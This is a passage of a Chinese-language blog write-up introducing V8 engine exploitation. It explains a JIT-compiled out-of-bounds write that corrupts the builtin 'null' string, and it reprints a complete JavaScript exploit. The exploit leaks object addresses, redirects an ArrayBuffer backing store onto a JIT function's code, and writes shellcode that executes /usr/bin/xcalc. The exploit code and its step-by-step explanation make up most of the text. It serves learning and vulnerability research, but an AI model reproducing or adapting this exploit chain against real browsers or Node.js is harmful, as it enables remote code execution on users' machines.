class="hljs-number">0</span><br> - elements kind: FAST_HOLEY_SMI_ELEMENTS<br> - unused <span class="hljs-keyword">property</span> fields: <span class="hljs-number">0</span><br> - enum length: invalid<br> - back pointer: <span class="hljs-number">0</span>x3bd4a9582311 &lt;undefined&gt;<br> - instance descriptors (own) <span class="hljs-string">#0</span>: <span class="hljs-number">0</span>x3bd4a9582231 &lt;FixedArray[<span class="hljs-number">0</span>]&gt;<br> - layout descriptor: <span class="hljs-number">0</span><br> - transitions <span class="hljs-string">#1</span>: <span class="hljs-number">0</span>x3194ff9ac891 WeakCell <span class="hljs-keyword">for</span> <span class="hljs-number">0</span>x3a202ca8c391 &lt;Map(FAST_HOLEY_SMI_ELEMENTS)&gt;<br>     #xyz: (transition <span class="hljs-keyword">to</span> data), attrs: [WEC] -&gt; <span class="hljs-number">0</span>x3a202ca8c391 &lt;Map(FAST_HOLEY_SMI_ELEMENTS)&gt;<br> - prototype: <span class="hljs-number">0</span>x3194ff995e49 &lt;an <span class="hljs-keyword">Object</span> <span class="hljs-keyword">with</span> map <span class="hljs-number">0</span>x3a202ca86561&gt;<br> - <span class="hljs-function"><span class="hljs-keyword">constructor</span>:</span> <span class="hljs-number">0</span>x3194ff995be9 &lt;JS <span class="hljs-function"><span class="hljs-keyword">Function</span> <span class="hljs-title">Set</span> <span class="hljs-params">(SharedFunctionInfo 0x3bd4a959cb31)</span>&gt;</span><br><span class="hljs-function"> - <span class="hljs-title">code</span> <span class="hljs-title">cache</span>:</span> <span class="hljs-number">0</span>x3bd4a9582241 &lt;FixedArray[<span class="hljs-number">0</span>]&gt;<br> - dependent code: <span class="hljs-number">0</span>x3194ff9ac559 &lt;FixedArray[<span class="hljs-number">3</span>]&gt;<br> - construction counter: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<p>接着会</p>
+<p>mov    rax, qword ptr [rax + 7]</p>
+<p>即取出rax的elements对象地址</p>
+<p>然后会进一步取出n.xyz并进行赋值，也就是这出了问题</p>
+<p><img src="image-20220322164501837.png" srcset="/img/loading.gif" lazyload alt="image-20220322164501837"></p>
+<p>这一步会破坏string map结构导致下面parseInt(‘AAAAAAAA’);报错</p>
+<p><img src="image-20220322192002609.png" srcset="/img/loading.gif" lazyload alt="image-20220322192002609"></p>
+<p>n.xyz = 0x826852f4;</p>
+<p>0x826852f4被当作double处理所以是0x41E04D0A5E800000</p>
+<p>所以现在存在一个越界写，为了不破坏string map我们需要伪造下使得</p>
+<p>n.xyz = 3.4766863919133141e-308;//0x019000400007300</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>完整exp直接照搬sakura博客了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x200</span>);<br><span class="hljs-keyword">var</span> n;<br><span class="hljs-keyword">var</span> m;<br><span class="hljs-keyword">var</span> l;<br><br><br><span class="hljs-keyword">var</span> evil_f = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(<span class="hljs-string">&quot;var a = 1000000&quot;</span>);<br><br><span class="hljs-comment">// int-&gt;double</span><br><span class="hljs-comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d2u</span>(<span class="hljs-params">num1,num2</span>)</span>&#123;<br>    d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(<span class="hljs-number">2</span>);<br>    d[<span class="hljs-number">0</span>] = num2;<br>    d[<span class="hljs-number">1</span>] = num1;<br>    f = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(d.buffer);<br>    <span class="hljs-keyword">return</span> f[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-comment">// double-&gt;int</span><br><span class="hljs-comment">// u2d(floataddr)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">u2d</span>(<span class="hljs-params">num</span>)</span>&#123;<br>    f = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);<br>    f[<span class="hljs-number">0</span>] = num;<br>    d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(f.buffer);<br>    <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>] * <span class="hljs-number">0x100000000</span> + d[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ctor</span>(<span class="hljs-params"></span>) </span>&#123;<br>	n = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>();	<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ctor2</span>(<span class="hljs-params"></span>) </span>&#123;<br>	m = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Map</span>();	<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Ctor3</span>(<span class="hljs-params"></span>) </span>&#123;<br>	l = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check</span>(<span class="hljs-params">obj</span>)</span>&#123;<br><span class="hljs-comment">// oob write empty_Fixed_Array, write object to null_str buffer</span><br>    n.xyz = <span class="hljs-number">3.4766863919152113e-308</span>; <span class="hljs-comment">// do not modify string map</span><br>    n.xyz1 = <span class="hljs-number">0x0</span>; <span class="hljs-comment">// do not modify the value</span><br>    n.xyz2 = <span class="hljs-number">0x7000</span>; <span class="hljs-comment">// enlarge length of builtIn string &#x27;null&#x27;</span><br>    n.xyz3 = obj; <span class="hljs-comment">// leak the Object addr</span><br>&#125;<br><span class="hljs-comment">// print(&quot;0x&quot;+u2d(3.4766863919133141e-308;</span><br><span class="hljs-comment">// print(d2u(0x0019000400007300/0x100000000,0x0019000400007300&amp;0xffffffff));</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check2</span>(<span class="hljs-params">addr</span>)</span>&#123;<br>	<span class="hljs-comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span><br>	m.xyz = <span class="hljs-number">3.4766863919152113e-308</span>;    <span class="hljs-comment">// do not modify string map</span><br>	m.xyz1 = <span class="hljs-number">0x0</span>                 <span class="hljs-comment">// do not modify the value</span><br>	m.xyz2 = <span class="hljs-number">0x7000</span> 				    <span class="hljs-comment">// enlarge length of builtIn string &#x27;null&#x27;</span><br>    m.xyz3 = addr 	<br>&#125;				<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check3</span>(<span class="hljs-params">addr</span>)</span>&#123;<br>	<span class="hljs-comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span><br>	l.xyz = <span class="hljs-number">3.4766863919152113e-308</span>;    <span class="hljs-comment">// do not modify string map</span><br>	l.xyz1 = addr  <br>&#125;<br><br><br><span class="hljs-comment">// JIT优化</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10000</span>; ++i) &#123;<br>    Ctor();<br>    Ctor2();<br>    Ctor3();<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10000</span>; ++i) &#123;<br>    Check(<span class="hljs-literal">null</span>);<br>    Check2(<span class="hljs-number">3.4766863919152113e-308</span>);<br>    Check3(<span class="hljs-number">3.4766863919152113e-308</span>);<br>&#125;<br><br>Ctor(); <span class="hljs-comment">// 初始化n</span><br>Ctor2(); <span class="hljs-comment">// 初始化m</span><br>Ctor3(); <span class="hljs-comment">// 初始化l</span><br>print(<span class="hljs-string">&quot;jsset is :&quot;</span>);<br>%DebugPrint(n);<br><span class="hljs-comment">// %DebugPrint(Check);</span><br><span class="hljs-comment">// read(1);//插入断点</span><br>Check(ab);<br><br><span class="hljs-keyword">var</span> str = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(<span class="hljs-literal">null</span>);<br>%DebugPrint(ab);<br><span class="hljs-keyword">var</span> ab_addr = str.charCodeAt(<span class="hljs-number">0</span>)*<span class="hljs-number">0x1</span>+str.charCodeAt(<span class="hljs-number">1</span>)*<span class="hljs-number">0x100</span>+str.charCodeAt(<span class="hljs-number">2</span>)*<span class="hljs-number">0x10000</span>+str.charCodeAt(<span class="hljs-number">3</span>)*<span class="hljs-number">0x1000000</span>+str.charCodeAt(<span class="hljs-number">4</span>)*<span class="hljs-number">0x100000000</span>+str.charCodeAt(<span class="hljs-number">5</span>)*<span class="hljs-number">0x10000000000</span>+str.charCodeAt(<span class="hljs-number">6</span>)*<span class="hljs-number">0x1000000000000</span>+str.charCodeAt(<span class="hljs-number">7</span>)*<span class="hljs-number">0x100000000000000</span>;<br>print(<span class="hljs-string">&quot;0x&quot;</span>+ab_addr.toString(<span class="hljs-number">16</span>));<br><span class="hljs-keyword">var</span> ab_len_ptr = ab_addr+<span class="hljs-number">24</span>;<br><br>ab_len_ptr_float = d2u(ab_len_ptr/<span class="hljs-number">0x100000000</span>,ab_len_ptr&amp;<span class="hljs-number">0xffffffff</span>);<br>Check(evil_f);<br>%DebugPrint(evil_f);<br><span class="hljs-keyword">var</span> func_addr = str.charCodeAt(<span class="hljs-number">0</span>)*<span class="hljs-number">0x1</span>+str.charCodeAt(<span class="hljs-number">1</span>)*<span class="hljs-number">0x100</span>+str.charCodeAt(<span class="hljs-number">2</span>)*<span class="hljs-number">0x10000</span>+str.charCodeAt(<span class="hljs-number">3</span>)*<span class="hljs-number">0x1000000</span>+str.charCodeAt(<span class="hljs-number">4</span>)*<span class="hljs-number">0x100000000</span>+str.charCodeAt(<span class="hljs-number">5</span>)*<span class="hljs-number">0x10000000000</span>+str.charCodeAt(<span class="hljs-number">6</span>)*<span class="hljs-number">0x1000000000000</span>+str.charCodeAt(<span class="hljs-number">7</span>)*<span class="hljs-number">0x100000000000000</span>;<br>print(<span class="hljs-string">&quot;0x&quot;</span>+func_addr.toString(<span class="hljs-number">16</span>));<br>func_addr = func_addr - <span class="hljs-number">1</span>;<br>func_addr_float = d2u(func_addr/<span class="hljs-number">0x100000000</span>,func_addr&amp;<span class="hljs-number">0xffffffff</span>);<br><br>Check(<span class="hljs-built_in">String</span>(<span class="hljs-literal">null</span>));<br><span class="hljs-comment">// %DebugPrint(Check2);</span><br><span class="hljs-comment">// read(1);//插入断点                 </span><br><br>Check2(ab_len_ptr_float);<br><br><br>Check3(func_addr_float);<br><br>f64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(ab);<br>shellcode_addr_float = f64[<span class="hljs-number">7</span>];<br>print(<span class="hljs-string">&quot;0x&quot;</span>+(u2d(shellcode_addr_float)).toString(<span class="hljs-number">16</span>));<br>Check3(shellcode_addr_float);<br><span class="hljs-comment">// pop /usr/bin/xcalc</span><br><span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(ab);<br>shellcode[<span class="hljs-number">0</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">2</span>] = <span class="hljs-number">0x782fb848</span>;<br>shellcode[<span class="hljs-number">3</span>] = <span class="hljs-number">0x636c6163</span>;<br>shellcode[<span class="hljs-number">4</span>] = <span class="hljs-number">0x48500000</span>;<br>shellcode[<span class="hljs-number">5</span>] = <span class="hljs-number">0x73752fb8</span>;<br>shellcode[<span class="hljs-number">6</span>] = <span class="hljs-number">0x69622f72</span>;<br>shellcode[<span class="hljs-number">7</span>] = <span class="hljs-number">0x8948506e</span>;<br>shellcode[<span class="hljs-number">8</span>] = <span class="hljs-number">0xc03148e7</span>;<br>shellcode[<span class="hljs-number">9</span>] = <span class="hljs-number">0x89485750</span>;<br>shellcode[<span class="hljs-number">10</span>] = <span class="hljs-number">0xd23148e6</span>;<br>shellcode[<span class="hljs-number">11</span>] = <span class="hljs-number">0x3ac0c748</span>;<br>shellcode[<span class="hljs-number">12</span>] = <span class="hljs-number">0x50000030</span>;<br>shellcode[<span class="hljs-number">13</span>] = <span class="hljs-number">0x4944b848</span>;<br>shellcode[<span class="hljs-number">14</span>] = <span class="hljs-number">0x414c5053</span>;<br>shellcode[<span class="hljs-number">15</span>] = <span class="hljs-number">0x48503d59</span>;<br>shellcode[<span class="hljs-number">16</span>] = <span class="hljs-number">0x3148e289</span>;<br>shellcode[<span class="hljs-number">17</span>] = <span class="hljs-number">0x485250c0</span>;<br>shellcode[<span class="hljs-number">18</span>] = <span class="hljs-number">0xc748e289</span>;<br>shellcode[<span class="hljs-number">19</span>] = <span class="hljs-number">0x00003bc0</span>;<br>shellcode[<span class="hljs-number">20</span>] = <span class="hljs-number">0x050f00</span>;<br><br>evil_f();<br></code></pre></td></tr></table></figure>
+<p>下面讲解原理</p>
+<p><img src="image-20220323234945957.png" srcset="/img/loading.gif" lazyload alt="image-20220323234945957"></p>
+<p>先触发优化然后Check(ab);</p>
+<p>poc已经知道这里会越界写下面的string null结构</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> Check(obj)&#123;<br><span class="hljs-regexp">//</span> oob write empty_Fixed_Array, write object to null_str buffer<br>    n.xyz = <span class="hljs-number">3.4766863919152113</span>e-<span class="hljs-number">308</span>; <span class="hljs-regexp">//</span> <span class="hljs-keyword">do</span> not modify string map<br>    n.xyz1 = <span class="hljs-number">0</span>x0; <span class="hljs-regexp">//</span> <span class="hljs-keyword">do</span> not modify the value<br>    n.xyz2 = <span class="hljs-number">0</span>x7000; <span class="hljs-regexp">//</span> enlarge length of builtIn string <span class="hljs-string">&#x27;null&#x27;</span><br>    n.xyz3 = obj; <span class="hljs-regexp">//</span> leak the Object addr<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>n.xyz是string map</p>
+<p>xyz1是hash</p>
+<p>xyz2是length，这边扩大到0x7000,string null是4</p>
+<p>xyz3是需要leak的值，写入任意ab地址后通过读取string值即可达成leak</p>
+<p><img src="image-20220323235218771.png" srcset="/img/loading.gif" lazyload alt="image-20220323235218771"></p>
+<p>成功写入然后</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> ab_addr = str.charCodeAt(<span class="hljs-number">0</span>)*<span class="hljs-number">0x1</span>+str.charCodeAt(<span class="hljs-number">1</span>)*<span class="hljs-number">0x100</span>+str.charCodeAt(<span class="hljs-number">2</span>)*<span class="hljs-number">0x10000</span>+str.charCodeAt(<span class="hljs-number">3</span>)*<span class="hljs-number">0x1000000</span>+str.charCodeAt(<span class="hljs-number">4</span>)*<span class="hljs-number">0x100000000</span>+str.charCodeAt(<span class="hljs-number">5</span>)*<span class="hljs-number">0x10000000000</span>+str.charCodeAt(<span class="hljs-number">6</span>)*<span class="hljs-number">0x1000000000000</span>+str.charCodeAt(<span class="hljs-number">7</span>)*<span class="hljs-number">0x100000000000000</span>;<br></code></pre></td></tr></table></figure>
+<p>同理leak出evil_f function地址</p>
+<p>然后把string null写入该地址</p>
+<p>下面看下check2</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check2</span>(<span class="hljs-params">addr</span>)</span>&#123;<br>	<span class="hljs-comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span><br>	m.xyz = <span class="hljs-number">3.4766863919152113e-308</span>;    <span class="hljs-comment">// do not modify string map</span><br>	m.xyz1 = <span class="hljs-number">0x0</span>                 <span class="hljs-comment">// do not modify the value</span><br>	m.xyz2 = <span class="hljs-number">0x7000</span> 				    <span class="hljs-comment">// enlarge length of builtIn string &#x27;null&#x27;</span><br>    m.xyz3 = addr 	<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>check2和check不同。xyz3会被当作指针解析</p>
+<p>string null地址写入后，调用check2会把addr写入string null+0x8处</p>
+<p>这边把ab_len_ptr_float写入，因为ab_len_ptr_float后面紧跟着backingstore</p>
+<p>下面调用check3，check3会把xyz1域当作指针解析即地址会被写入ab_len_ptr_float+0x8处即直接写backingstore</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check3</span>(<span class="hljs-params">addr</span>)</span>&#123;<br>	<span class="hljs-comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span><br>	l.xyz = <span class="hljs-number">3.4766863919152113e-308</span>;    <span class="hljs-comment">// do not modify string map</span><br>	l.xyz1 = addr  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>调用Check3(func_addr_float);把func地址写入后</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">f64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(ab);<br>shellcode_addr_float = f64[<span class="hljs-number">7</span>];<br>print(<span class="hljs-string">&quot;0x&quot;</span>+(u2d(shellcode_addr_float)).toString(<span class="hljs-number">16</span>));<br></code></pre></td></tr></table></figure>
+<p>获取code地址，第七个成员就是code地址。</p>
+<p><img src="image-20220323235757727.png" srcset="/img/loading.gif" lazyload alt="image-20220323235757727"></p>
+<p>最后把code地址写入backingstore然后分配array赋值shellcode即可。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript">Check3(shellcode_addr_float);<br><span class="hljs-comment">// pop /usr/bin/xcalc</span><br><span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(ab);<br>shellcode[<span class="hljs-number">0</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">2</span>] = <span class="hljs-number">0x782fb848</span>;<br>shellcode[<span class="hljs-number">3</span>] = <span class="hljs-number">0x636c6163</span>;<br>shellcode[<span class="hljs-number">4</span>] = <span class="hljs-number">0x48500000</span>;<br>shellcode[<span class="hljs-number">5</span>] = <span class="hljs-number">0x73752fb8</span>;<br>shellcode[<span class="hljs-number">6</span>] = <span class="hljs-number">0x69622f72</span>;<br>shellcode[<span class="hljs-number">7</span>] = <span class="hljs-number">0x8948506e</span>;<br>shellcode[<span class="hljs-number">8</span>] = <span class="hljs-number">0xc03148e7</span>;<br>shellcode[<span class="hljs-number">9</span>] = <span class="hljs-number">0x89485750</span>;<br>shellcode[<span class="hljs-number">10</span>] = <span class="hljs-number">0xd23148e6</span>;<br>shellcode[<span class="hljs-number">11</span>] = <span class="hljs-number">0x3ac0c748</span>;<br>shellcode[<span class="hljs-number">12</span>] = <span class="hljs-number">0x50000030</span>;<br>shellcode[<span class="hljs-number">13</span>] = <span class="hljs-number">0x4944b848</span>;<br>shellcode[<span class="hljs-number">14</span>] = <span class="hljs-number">0x414c5053</span>;<br>shellcode[<span class="hljs-number">15</span>] = <span class="hljs-number">0x48503d59</span>;<br>shellcode[<span class="hljs-number">16</span>] = <span class="hljs-number">0x3148e289</span>;<br>shellcode[<span class="hljs-number">17</span>] = <span class="hljs-number">0x485250c0</span>;<br>shellcode[<span class="hljs-number">18</span>] = <span class="hljs-number">0xc748e289</span>;<br>shellcode[<span class="hljs-number">19</span>] = <span class="hljs-number">0x00003bc0</span>;<br>shellcode[<span class="hljs-number">20</span>] = <span class="hljs-number">0x050f00</span>;<br><br>evil_f();<br></code></pre></td></tr></table></figure>
+<p>很适合入门的漏洞哈，后续会搬上另一个CVE-2019-5782。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/v8/">#v8</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>v8入门</div>
+      <div>http://www.psbazx.com/2022/03/21/v8入门/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Beitragsautor</div>
+          <div>皮三宝</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Veröffentlicht am</div>
+          <div>March 21, 2022</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Urheberrechtshinweis</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/24/cve-2019-5782/" title="cve-2019-5782">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">cve-2019-5782</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/19/cve-2021-31956-win7-ver/" title="cve-2021-31956 win7 ver">
+                        <span class="hidden-mobile">cve-2021-31956 win7 ver</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Inhaltsverzeichnis</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
